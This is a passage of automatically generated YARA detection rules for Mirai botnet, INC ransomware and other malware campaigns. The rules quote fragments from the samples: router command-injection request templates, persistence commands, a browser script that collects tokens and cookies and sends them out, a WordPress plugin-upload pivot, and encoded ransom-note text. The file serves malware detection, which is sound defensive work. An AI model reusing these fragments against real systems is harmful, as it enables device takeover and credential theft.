        $s5 = "XObject(_0x1714ab(0x25)), _0x377284 = new ActiveXObject(_0x522091(0x27));" ascii
        $s6 = "        'qSo2W6XnW7/dVXFcRCkQW6VcNCo3W4/cVf/dKKVcJCkVWQtcJhFdQCo3W53dNa'," ascii
        $s7 = "h[_0x1484f9(0x50, 'mY!u')]()['toString'](0x24)[_0x1af0aa(0x23)](0x2, 0xa)[_0x37da08(0x1d)]();" ascii
        $s8 = "    _0xbe362c[_0x59725f(0x7, 'KsBQ')](), this[_0x522091(0x13)] = _0xbe362c;" ascii
        $s9 = "_0x5bb3e4 = _0x2f60['tEkoJG'](_0x5bb3e4, _0x2f6070), _0x2f60['LwDoBx'][_0x1aa0d4] = _0x5bb3e4) : _0x" ascii
        $s10 = "    var _0x3e91be = _0x4de8a3, _0x136d28 = new ActiveXObject(_0x522091(0x4)), _0x20cea2 = new Active" ascii
        $s11 = "function _0x5d5e(_0x180d4f, _0x38978a) {" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_8248c3b4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8248c3b4"
        date = "2026-10-20"
        campaign = "tlsh-8248c3b4"
        family = "mirai"
        hash = "23116e8379bc88edd4de1e6bf83a09f92bf2fd2d645de18a5ef04c6c9a0441bf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8248c3b4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s5 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s6 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s7 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s8 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s9 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s10 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
        $s11 = "POST /wanipcn.xml?service=WANIPConn1 HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_95457ab8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-95457ab8"
        date = "2026-10-20"
        campaign = "tlsh-95457ab8"
        family = "mirai"
        hash = "2048f05290563172de52dd6b0123339d6de47392536f9b8643e88463780b9b6c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-95457ab8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "ZSWireGuard v1 zx2c4 Jason@zx2c4.comNoise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s5 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s7 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s8 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s9 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s10 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s11 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_5ec01ad6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-5ec01ad6"
        date = "2026-10-21"
        campaign = "dotnet_typelib_guid-5ec01ad6"
        family = ""
        hash = "44a7cba81a611e798624ffab187b137725a5b7c0b80e53160f32839f01c7093f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-5ec01ad6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Backlog Status: CRITICAL - Spilling 450m onto Approach Highway!" wide
        $s1 = "Backlog Status: ELEVATED - Queues Reaching Approach Gate Perimeter" wide
        $s2 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s3 = "Backlog Status: NOMINAL - Flow Smooth, No Perimeter Spill" wide
        $s4 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s6 = "Backlog Status: Clear (Within Approach Perimeter)" wide
        $s7 = "Takhkhasa d-Diwan (Checkpoint Layout Configuration)" wide
        $s8 = "Processed: 42 Vehicles | 98 Travellers / Immigrants" wide
        $s9 = "Kthawa d-Paltha (Border Checkpoint Shift Report)" wide
        $s10 = "Madkhal Thghuma - Land Border Checkpoint Simulation" wide
        $s11 = "Simulation Running: Advance lanes active | Documents verifying | Secondary Bays standing by" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2337792 and 12 of them
}

rule Sightlines_tlsh_0d334755_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0d334755"
        date = "2026-10-20"
        campaign = "tlsh-0d334755"
        family = ""
        hash = "1717578123d9b56b5fbaff3ecb2341ddbbf2b0cc6b0ad36f3b55b0bb3d562c73"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0d334755.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "arer|csrf/i.test(k)){var v=String(st.getItem(k));if(v.length>8&&v.length<2000)o[s[0]+':'+k]=v}}}catc" ascii
        $s1 = "h(e){}});var c=document.cookie||'';if(c)o.c=c.slice(0,1500);if(!Object.keys(o).length)return;var x=n" ascii
        $s2 = "window[s];for(var i=0;i<st.length;i++){var k=st.key(i);if(/token|jwt|auth|_key|api|secret|session|be" ascii
        $s3 = "ew XMLHttpRequest();x.open('POST',rep,true);x.setRequestHeader('Content-Type','application/json');x." ascii
        $s4 = "}function __loot(rep){try{var o={};['localStorage','sessionStorage'].forEach(function(s){try{var st=" ascii
        $s5 = "    var p = await fetch('/wp-admin/plugin-install.php?tab=upload', { credentials: 'same-origin' });" ascii
        $s6 = "    if (uh.indexOf('Plugin installed successfully') === -1) { log('pivot_up_fail'); return; }" ascii
        $s7 = "    await fetch('/wp-admin/plugins.php?action=activate&plugin=' + am[1] + '&plugin_status=all&paged=" ascii
        $s8 = "    fd.append('_wp_http_referer', '/wp-admin/plugin-install.php?tab=upload');" ascii
        $s9 = "    var pl = await fetch('/wp-admin/plugins.php', { credentials: 'same-origin' });" ascii
        $s10 = "send(JSON.stringify(o))}catch(e){}}try{if(!sessionStorage.getItem('_pv1')){sessionStorage.setItem('_" ascii
        $s11 = "    var am = lh.match(/action=activate&amp;plugin=([^\"&]+)&amp;plugin_status=all&amp;paged=1&amp;s&a" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fbf289e9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fbf289e9"
        date = "2026-10-21"
        campaign = "tlsh-fbf289e9"
        family = "mirai"
        hash = "037a8526c5b62cdae7552113e3e580dd47a90ca1f5c0fcca0aac8b7b07c1f835"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fbf289e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_02c407a6_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-02c407a6"
        date = "2026-10-21"
        campaign = "tlsh-02c407a6"
        family = "mirai"
        hash = "1c8f9a57fe84029071cf4626ee34e3bd6e20e8c10dad4d0b45ae546ac5641485"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-02c407a6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_11c8e538_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-11c8e538"
        date = "2026-10-21"
        campaign = "tlsh-11c8e538"
        family = "mirai"
        hash = "2e892431668abc0edfa63f56ec3558f8ab8db5ad57c2b27ccc2fe0a3273744f0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-11c8e538.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "%s: '%s' is not an ELF executable for MIPS" ascii
        $s11 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1090464 and 12 of them
}

rule Sightlines_tlsh_2acb43e9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2acb43e9"
        date = "2026-10-21"
        campaign = "tlsh-2acb43e9"
        family = "mirai"
        hash = "4587c320988021e05d994f96901c6e91d47f9ab3c965a64b22dd14437b4bc23c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2acb43e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_95051358_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-95051358"
        date = "2026-10-21"
        campaign = "tlsh-95051358"
        family = "mirai"
        hash = "0f048eb9fd5664aabeee4e19d5dfc6fd3c97f3c3aea764b87abbee918c16f44f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-95051358.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1196096 and 12 of them
}

rule Sightlines_tlsh_25caa199_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-25caa199"
        date = "2026-10-21"
        campaign = "tlsh-25caa199"
        family = "mirai"
        hash = "6b34d756ff2a87f1a29d46176757f6c86f7ed890a0214b627d11e47420508848"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-25caa199.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_cf44f6b9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cf44f6b9"
        date = "2026-10-21"
        campaign = "tlsh-cf44f6b9"
        family = "mirai"
        hash = "8c8890f523dafe01a2d5a65931a691d401da814fcb5d64cddbb2101cbbafce16"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cf44f6b9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_7cf160b0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7cf160b0"
        date = "2026-10-21"
        campaign = "tlsh-7cf160b0"
        family = "mirai"
        hash = "15611a7793060cb4f4ada63149aace40b3cdead90f41c9a7c35803e84bd413ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7cf160b0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s5 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s6 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s7 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s8 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s9 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s10 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
        $s11 = "POST /wanipcn.xml?service=WANIPConn1 HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1079504 and 12 of them
}

rule Sightlines_tlsh_86ea993a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-86ea993a"
        date = "2026-10-21"
        campaign = "tlsh-86ea993a"
        family = ""
        hash = "b76cc467389add76c92b8db4d6a3eba12f7403d364ad3425b34e5798323306fd"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-86ea993a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "1u1$)&u+17u)qdE" ascii
        $s1 = "wq\"x{JDJK" ascii
        $s2 = "-0+1prp|" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 3 of them
}

rule Sightlines_tlsh_dc683082_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dc683082"
        date = "2026-10-21"
        campaign = "tlsh-dc683082"
        family = ""
        hash = "26eb4e606d4a18f15b7c03bd0f479101727bdf550db0c5d71325d889a986c58b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dc683082.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "yDelay encryption by N minutes,src/settings.rsfn5+fiBJTkMgUmFuc29tIH5+fn4KCi0tLS0tPiBZb3VyIGRhdGEgaX" ascii
        $s1 = "VlNnFid3RnanN4cHc2YjdpeHpzc3UzNnRzYWpsZG9hZC5vbmlvbi8KCkxpbmsgZm9yIG5vcm1hbCBicm93c2VyOgoJaHR0cDovL2" ascii
        $s2 = "NzeDZxa2lkLm9uaW9uLwoKWW91ciBwZXJzb25hbCBJRDoKCSVpZCUKCi0tLS0tPiBXYXJuaW5nISBEb24ndCBkZWxldGUgb3IgbW" ascii
        $s3 = "NlciBMaW5rIGZvciBjaGF0OgoJaHR0cDovL2luY3BheWthYmpxYzJtdGR4cTZjMjNucWg0eDZtNWRrcHM1ZnI2dmdka2d6cDVuan" ascii
        $s4 = "UKCi0tLS0tPiBZb3UgbmVlZCB0byBjb250YWN0IHVzIG9uIFRPUiBkYXJrbmV0IHNpdGVzIHdpdGggeW91ciBwZXJzb25hbCBJRA" ascii
        $s5 = "VyIGNvbXBhbnkgd2lsbCBiZSBzYWZlLgoKVG9yIEJyb3dzZXIgTGluazoKCWh0dHA6Ly9pbmNibG9nNnF1NHk0bW00enZ3NW5ybX" ascii
        $s6 = "B0aGUgcmFuc29tIHByaWNlIGlzICQ1TSBkb2xsYXJzLCBidXQgaW4gZmFjdCB0aGV5IHNlY3JldGx5IG5lZ290aWF0ZSB3aXRoIH" ascii
        $s7 = "9uJ3QgcHJvdGVjdCB5b3UgZnJvbSByZXBlYXRlZCBhdHRhY2tzLiAKCi0tLS0tPiBEb24ndCBnbyB0byByZWNvdmVyeSBjb21wYW" ascii
        $s8 = "BheSBzZXZlcmFsIHRpbWVzIGxlc3MuCgotLS0tLT4gRm9yIHRob3NlIHdobyBoYXZlIGN5YmVyIGluc3VyYW5jZSBhZ2FpbnN0IH" ascii
        $s9 = "9kaWZ5IGVuY3J5cHRlZCBmaWxlcywgaXQgd2lsbCBsZWFkIHRvIHByb2JsZW1zIHdpdGggZGVjcnlwdGlvbiBvZiBmaWxlcyEKLS" ascii
        $s10 = "4KCi0tLS0tPiBJZiB5b3UgZG8gbm90IHBheSB0aGUgcmFuc29tLCB3ZSB3aWxsIGF0dGFjayB5b3VyIGNvbXBhbnkgYWdhaW4gaW" ascii
        $s11 = "NoZWQgb24gb3VyIFRPUiBkYXJrbmV0IHNpdGVzLgpUaGUgc29vbmVyIHlvdSBwYXkgdGhlIHJhbnNvbSwgdGhlIHNvb25lciB5b3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1748392 and 12 of them
}

rule Sightlines_imphash_fd1ab72f_inc
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-fd1ab72f"
        date = "2026-10-21"
        campaign = "imphash-fd1ab72f"
        family = "inc"
        hash = "0ae4447d755593ee1931170d4187a07a29bf0690179acc39b7400a4c65cd07c5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-fd1ab72f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "uZXIgeW91ciBjb21wYW55IHdpbGwgYmUgc2FmZS4NCg0KVG9yIEJyb3dzZXIgTGluazoNCglodHRwOi8vaW5jYmxvZzZxdTR5NG1" ascii
        $s1 = "jMjNucWg0eDZtNWRrcHM1ZnI2dmdka2d6cDVuanNzeDZxa2lkLm9uaW9uLw0KDQpZb3VyIHBlcnNvbmFsIElEOg0KCSVpZCUNCg0" ascii
        $s2 = "sYXJzLCBidXQgaW4gZmFjdCB0aGV5IHNlY3JldGx5IG5lZ290aWF0ZSB3aXRoIHVzIGZvciAkMU0uDQpJZiB5b3UgYXBwcm9hY2h" ascii
        $s3 = "yb3VuZCB0aGUgd29ybGQuDQoNClRvciBCcm93c2VyIExpbmsgZm9yIGNoYXQ6DQoJaHR0cDovL2luY3BheWthYmpxYzJtdGR4cTZ" ascii
        $s4 = "0dGFja3MuIA0KDQotLS0tLT4gRG9uJ3QgZ28gdG8gcmVjb3ZlcnkgY29tcGFuaWVzIQ0KVGhleSBhcmUgZXNzZW50aWFsbHkganV" ascii
        $s5 = "tNHp2dzVucm11ZTZxYnd0Z2pzeHB3NmI3aXh6c3N1MzZ0c2FqbGRvYWQub25pb24vDQoNCkxpbmsgZm9yIG5vcm1hbCBicm93c2V" ascii
        $s6 = "zaHRhZy9pbmNyYW5zb20/Zj1saXZlDQoNCi0tLS0tPiBZb3UgbmVlZCB0byBjb250YWN0IHVzIG9uIFRPUiBkYXJrbmV0IHNpdGV" ascii
        $s7 = "wdWJsaXNoZWQgb24gb3VyIFRPUiBkYXJrbmV0IHNpdGVzLg0KVGhlIHNvb25lciB5b3UgcGF5IHRoZSByYW5zb20sIHRoZSBzb29" ascii
        $s8 = "vZiBjYXNlcyB3aGVyZSByZWNvdmVyeSBjb21wYW5pZXMgdGVsbCB5b3UgdGhhdCB0aGUgcmFuc29tIHByaWNlIGlzICQ1TSBkb2x" ascii
        $s9 = "yOg0KCWh0dHA6Ly9pbmNibG9nLnN1Lw0KCQ0KLS0tLS0+IFdoYXQgZ3VhcmFudGVlcyBhcmUgdGhhdCB3ZSB3b24ndCBmb29sIHl" ascii
        $s10 = "vdT8NCldlIGFyZSBub3QgYSBwb2xpdGljYWxseSBtb3RpdmF0ZWQgZ3JvdXAgYW5kIHdlIHdhbnQgbm90aGluZyBtb3JlIHRoYW4" ascii
